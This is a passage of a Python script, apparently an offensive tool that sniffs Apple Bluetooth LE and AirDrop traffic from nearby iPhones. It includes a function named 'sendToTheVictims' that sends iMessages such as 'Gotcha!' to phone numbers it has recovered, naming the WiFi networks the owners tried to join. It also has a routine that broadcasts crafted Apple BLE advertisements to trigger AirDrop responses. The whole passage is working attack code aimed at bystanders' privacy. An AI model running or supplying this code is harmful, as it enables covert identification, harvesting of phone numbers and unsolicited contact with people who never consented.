        print("Something wrong! Status: {}".format(r.status_code))


def sendToTheVictims(SSID_hash):
    global phone_number_info
    text = ''
    for phone in phone_number_info:
        if phone_number_info[phone]['name'] and get_dict_val(dictOfss, SSID_hash):
            text = 'Hi {}! Looks like you have tried to connect to WiFi:{}'.format(phone_number_info[phone]['name'],
                                                                                   get_dict_val(dictOfss, SSID_hash))
        elif phone_number_info[phone]['name']:
            text = 'Hi {}! Gotcha!'.format(phone_number_info[phone]['name'])
        elif get_dict_val(dictOfss, SSID_hash):
            text = 'Looks like you have tried to connect to WiFi:{}'.format(get_dict_val(dictOfss, SSID_hash))
        else:
            text = 'Gotcha!'
        if args.check_hlr:
            if phone_number_info[phone]['status'] == 'Live':
                send_imessage(phone, text)
        else:
            send_imessage(phone, text)
        time.sleep(2)


def start_listetninig():
    AirDropCli(["find"])


def adv_airdrop():
    while True:
        dev_id = 0
        toggle_device(dev_id, True)
        header = (0x02, 0x01, 0x1a, 0x1b, 0xff, 0x4c, 0x00)
        data1 = (0x05, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01)
        apple_id = (0x00, 0x00)
        phone = (0x00, 0x00)
        email = (0xb7, 0x9b)
        data2 = (0x00, 0x00, 0x00, 0x10, 0x02, 0x0b, 0x00)
        try:
            sock = bluez.hci_open_dev(dev_id)
        except:
            print("Cannot open bluetooth device %i" % dev_id)
            raise
        start_le_advertising(sock, adv_type=0x02, min_interval=500, max_interval=500,
                             data=(header + data1 + apple_id + phone + email + data2))
        time.sleep(10)
        stop_le_advertising(sock)


def print_results3(data):
    if not len(data):
        return ''
    u_data = []
    for dev in data:
        if dev not in u_data:
            u_data.append(dev)
    x = PrettyTable()
    x.field_names = ["Name", "Host", "OS", "Discoverable", 'Address']
    for dev in u_data:
        x.add_row([dev['name'], dev['host'], dev['os'], dev['discoverable'], dev['address']])
    return x.get_string()


if args.ssid:
    thread_ssid = Thread(target=get_ssids, args=())
    thread_ssid.daemon = True
    thread_ssid.start()

if args.airdrop:
    thread2 = Thread(target=start_listetninig, args=())
    thread2.daemon = True
    thread2.start()

    thread3 = Thread(target=adv_airdrop, args=())
    thread3.daemon = True
    thread3.start()

init_bluez()
thread1 = Thread(target=do_sniff, args=(False,))
thread1.daemon = True
thread1.start()
MyApp = App()
MyApp.run()
thread1.join()
